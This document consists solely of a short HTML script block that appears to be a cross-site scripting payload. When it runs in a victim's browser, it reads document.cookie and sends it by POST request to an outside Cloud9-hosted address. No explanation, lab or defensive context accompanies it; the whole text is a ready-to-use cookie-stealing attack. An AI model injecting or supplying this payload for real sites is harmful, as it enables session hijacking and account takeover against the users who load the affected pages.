<script>
var http = new XMLHttpRequest();
var url = "http://learn-node.dan121.c9users.io/";
http.open("POST", url, true);
http.send(JSON.stringify({
    cookie: document.cookie
}));
</script>